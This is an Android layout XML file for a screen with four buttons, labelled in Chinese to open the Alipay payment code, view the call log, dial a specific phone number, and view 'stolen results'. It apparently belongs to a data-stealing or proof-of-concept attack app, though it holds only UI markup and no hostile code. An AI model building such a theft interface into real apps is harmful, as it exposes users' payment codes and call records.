<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:gravity="center"
    android:orientation="vertical"
    android:background="#ffffff"
    android:padding="30dp">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text=""
        android:textSize="22sp"
        android:textColor="#333333"
        android:layout_marginBottom="40dp" />

    <Button android:id="@+id/btn_alipay"
        android:layout_width="260dp" android:layout_height="56dp"
        android:text="1. 打开支付宝付款码" android:textSize="15sp"
        android:layout_marginBottom="16dp" />

    <Button android:id="@+id/btn_calllog"
        android:layout_width="260dp" android:layout_height="56dp"
        android:text="2. 查看通话记录" android:textSize="15sp"
        android:layout_marginBottom="16dp" />

    <Button android:id="@+id/btn_call"
        android:layout_width="260dp" android:layout_height="56dp"
        android:text="3. 拨打 19179193039" android:textSize="15sp"
        android:layout_marginBottom="16dp" />

    <Button android:id="@+id/btn_result"
        android:layout_width="260dp" android:layout_height="56dp"
        android:text="📊 查看窃取结果" android:textSize="15sp"
        android:layout_marginBottom="16dp" />

</LinearLayout>
